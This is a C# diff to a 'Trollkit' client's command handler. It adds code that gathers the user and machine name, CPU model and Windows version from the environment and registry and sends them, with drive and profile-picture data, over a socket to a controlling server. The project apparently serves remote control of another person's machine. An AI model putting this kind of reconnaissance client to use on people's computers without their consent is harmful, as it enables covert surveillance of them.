@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
@@ -27,16 +28,59 @@ namespace Trollkit_Client.Modules.CommandHandlers
 
 		private void CollectAndReturnSystemInfo(Socket s)
 		{
+			string userName = $"> {Environment.UserName} on {Environment.MachineName}";
+			TransferCommandObject userNameTransferObject = new TransferCommandObject { Command = "ComputerName", Value = userName };
+			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(userNameTransferObject));
+
+			string cpu = GetCPUName();
+			TransferCommandObject cpuTranfserObject = new TransferCommandObject { Command = "CPU", Value = cpu };
+			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(cpuTranfserObject));
+
 			string drives = GetSystemDrives();
 			TransferCommandObject drivesTransferObject = new TransferCommandObject { Command = "Drives", Value = drives };
 			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(drivesTransferObject));
 
-			//TODO: cpu, ram??, windows version, network, peripherals
 			string base64ProfilePicture = WindowsProfilePicture.Get448ImageString();
 			TransferCommandObject pfTransferObject = new TransferCommandObject { Command = "ProfilePicture", Value = base64ProfilePicture };
 			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(pfTransferObject));
+
+			//TODO: cpu, ram??, windows version, network, peripherals
+
+			string osVersion = GetOSVersion();
+			TransferCommandObject osVersionTransferObject = new TransferCommandObject { Command = "WindowsVersion", Value = osVersion };
+			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(osVersionTransferObject));
+
+
+
 		}
 
+		private string GetCPUName()
+		{
+			RegistryKey key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0", false);
+			if(key != null)
+			{
+				string processor = key.GetValue("ProcessorNameString", "Unknown Processor").ToString();
+				return processor;
+			}
+
+			return "Unknown Processor";
+		}
+
+		private string GetOSVersion()
+		{
+			RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", false);
+			if (key != null)
+			{
+				string releaseId = key.GetValue("ReleaseId", "").ToString();
+				string productName = key.GetValue("ProductName", "Unknown OS").ToString();
+
+				string bit = Environment.Is64BitOperatingSystem ? "64 Bit" : "32 Bit";
+
+				return $"{productName} [{releaseId}] ({bit})";
+			}
+
+			return "Unknown OS Version";
+		}
 
         private string GetSystemDrives()
         {
